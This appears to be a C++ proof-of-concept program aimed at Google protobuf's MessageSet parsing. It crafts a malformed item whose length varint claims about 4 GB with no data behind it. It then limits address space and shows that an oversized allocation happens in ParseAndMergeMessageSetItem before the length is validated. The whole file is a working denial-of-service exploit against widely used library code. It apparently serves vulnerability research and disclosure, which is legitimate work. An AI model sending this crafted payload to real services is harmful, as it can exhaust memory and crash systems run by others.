#include <cstdint>
#include <cstdlib>
#include <exception>
#include <iomanip>
#include <iostream>
#include <memory>
#include <sstream>
#include <string>
#include <sys/resource.h>

#include <google/protobuf/descriptor.h>
#include <google/protobuf/dynamic_message.h>
#include <google/protobuf/io/coded_stream.h>
#include <google/protobuf/message.h>
#include <google/protobuf/wire_format.h>
#include <google/protobuf/wire_format_lite.h>

namespace {

constexpr uint32_t kClaimedLength = 0xfffffff0u;
constexpr rlim_t kAddressSpaceLimit = 512ull * 1024ull * 1024ull;

std::string EncodeVarint(uint64_t value) {
  std::string out;
  while (value >= 0x80) {
    out.push_back(static_cast<char>((value & 0x7f) | 0x80));
    value >>= 7;
  }
  out.push_back(static_cast<char>(value));
  return out;
}

std::string BuildMaliciousMessageSetItem() {
  std::string payload;
  payload.push_back(static_cast<char>(
      google::protobuf::internal::WireFormatLite::kMessageSetItemStartTag));
  payload.push_back(static_cast<char>(
      google::protobuf::internal::WireFormatLite::kMessageSetMessageTag));
  payload += EncodeVarint(kClaimedLength);
  return payload;
}

std::string HexPreview(const std::string& bytes) {
  std::ostringstream oss;
  oss << std::hex << std::setfill('0');
  for (unsigned char c : bytes) {
    oss << std::setw(2) << static_cast<unsigned int>(c) << ' ';
  }
  return oss.str();
}

}  // namespace

int main() {
  const std::string wire = BuildMaliciousMessageSetItem();
  const uint32_t computed_size =
      kClaimedLength +
      google::protobuf::io::CodedOutputStream::VarintSize32(kClaimedLength);

  std::cerr << "=== STATE CAPTURE POC ===\n";
  std::cerr << "[SETUP] wire_size=" << wire.size() << " bytes\n";
  std::cerr << "[SETUP] claimed_length=" << kClaimedLength << " (0x" << std::hex
            << kClaimedLength << std::dec << ")\n";
  std::cerr << "[SETUP] varint_size="
            << google::protobuf::io::CodedOutputStream::VarintSize32(
                   kClaimedLength)
            << "\n";
  std::cerr << "[SETUP] computed_resize_size=" << computed_size
            << " bytes\n";
  std::cerr << "[SETUP] available_payload_bytes_after_length=0\n";
  std::cerr << "[SETUP] wire_hex=" << HexPreview(wire) << "\n";

  const google::protobuf::Descriptor* descriptor =
      google::protobuf::DescriptorPool::generated_pool()
          ->FindMessageTypeByName("google.protobuf.bridge.MessageSet");
  if (descriptor == nullptr) {
    std::cerr << "[FAIL] descriptor lookup failed\n";
    return 2;
  }

  google::protobuf::DynamicMessageFactory factory;
  const google::protobuf::Message* prototype = factory.GetPrototype(descriptor);
  if (prototype == nullptr) {
    std::cerr << "[FAIL] prototype lookup failed\n";
    return 3;
  }

  std::unique_ptr<google::protobuf::Message> message(prototype->New());
  google::protobuf::io::CodedInputStream input(
      reinterpret_cast<const uint8_t*>(wire.data()),
      static_cast<int>(wire.size()));
  const uint32_t start_tag = input.ReadTag();
  std::cerr << "[STATE] start_tag=" << start_tag << "\n";
  if (start_tag !=
      google::protobuf::internal::WireFormatLite::kMessageSetItemStartTag) {
    std::cerr << "[FAIL] wrong start tag\n";
    return 4;
  }

  struct rlimit old_limit {};
  if (getrlimit(RLIMIT_AS, &old_limit) == 0) {
    std::cerr << "[STATE] old_rlimit_as_cur=" << old_limit.rlim_cur << "\n";
    std::cerr << "[STATE] old_rlimit_as_max=" << old_limit.rlim_max << "\n";
  }
  struct rlimit new_limit {};
  new_limit.rlim_cur = kAddressSpaceLimit;
  new_limit.rlim_max = kAddressSpaceLimit;
  if (setrlimit(RLIMIT_AS, &new_limit) != 0) {
    std::cerr << "[FAIL] setrlimit(RLIMIT_AS) failed\n";
    return 5;
  }
  std::cerr << "[STATE] new_rlimit_as_cur=" << kAddressSpaceLimit << "\n";
  std::cerr << "[CHECKPOINT] before ParseAndMergeMessageSetItem\n";
  try {
    const bool ok = google::protobuf::internal::WireFormat::
        ParseAndMergeMessageSetItem(&input, message.get());
    std::cerr << "[RESULT] ParseAndMergeMessageSetItem returned " << ok << "\n";
    std::cerr << "[RESULT] No oversized allocation intercepted\n";
    return ok ? 0 : 1;
  } catch (const std::bad_alloc&) {
    std::cerr
        << "[RESULT] intercepted oversized allocation before ReadRaw validation\n";
    return 0;
  } catch (const std::exception& ex) {
    std::cerr << "[FAIL] unexpected exception: " << ex.what() << "\n";
    return 5;
  }
}
